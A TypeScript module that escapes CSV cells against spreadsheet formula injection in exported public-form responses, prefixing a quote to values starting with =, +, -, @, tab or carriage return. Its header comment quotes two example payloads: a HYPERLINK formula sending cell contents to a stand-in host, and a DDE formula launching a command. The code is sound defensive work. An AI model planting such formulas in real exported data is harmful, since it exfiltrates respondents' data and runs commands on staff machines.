/**
 * CSV that Excel opens as data rather than as a program.
 *
 * Quoting a field protects the *file*: a comma or a newline inside a value no
 * longer breaks the column layout. It does nothing for the *reader*. Excel,
 * LibreOffice and Google Sheets all decide whether a cell is a formula by
 * looking at its first character after unquoting, so `"=HYPERLINK(...)"` is
 * still a live formula when the file is opened.
 *
 * That matters here because the values come from a public form. A respondent
 * types the payload, a member of staff exports the responses and double-clicks
 * the file, and the formula runs with that person's access to their own
 * machine. The two classic shapes are
 *
 *     =HYPERLINK("https://evil.tld/?x="&A1&A2&A3,"Click for your refund")
 *     =cmd|' /C calc'!A0
 *
 * — the first exfiltrates other respondents' answers on one click, the second
 * asks for permission to run a program and gets it often enough to be worth an
 * attacker's time.
 *
 * The fix is the one OWASP recommends: put a single quote in front, which
 * spreadsheets treat as "the rest of this cell is text". The quote is visible
 * in the formula bar and not in the cell, and the value is unchanged for any
 * program that parses the CSV properly.
 */

/**
 * Characters that make a spreadsheet treat the rest of the cell as an
 * expression. Tab and carriage return are included because a leading
 * whitespace character is stripped before the first real character is
 * examined, which is enough to hide a `=` from a naive check.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * True when `value` would be evaluated rather than displayed.
 *
 * Exported so the guard can be asserted directly in tests rather than inferred
 * from a rendered row.
 */
export function isFormulaLike(value: string): boolean {
  return FORMULA_TRIGGER.test(value);
}

/**
 * One CSV cell: neutralised if it looks like a formula, then quoted.
 *
 * Always quoted, not just when it contains a delimiter. Unconditional quoting
 * costs two bytes and removes a whole class of "this one value happened to
 * contain a comma" bug, and it is what the previous implementation did, so
 * existing consumers see no change beyond the leading quote on the handful of
 * cells that needed one.
 */
export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '""';

  const text = typeof value === 'object' ? JSON.stringify(value) : String(value);
  const guarded = isFormulaLike(text) ? `'${text}` : text;

  return `"${guarded.replace(/"/g, '""')}"`;
}

/** A CSV document from a header row and the rows beneath it. */
export function toCsv(headers: string[], rows: Array<Record<string, unknown>>): string {
  // Headers come from field ids, which respondents do not control — but a
  // header is a cell like any other and there is no reason to treat it
  // differently.
  const lines = [headers.map(escapeCsvCell).join(',')];
  for (const row of rows) {
    lines.push(headers.map((header) => escapeCsvCell(row[header])).join(','));
  }
  return lines.join('\n');
}
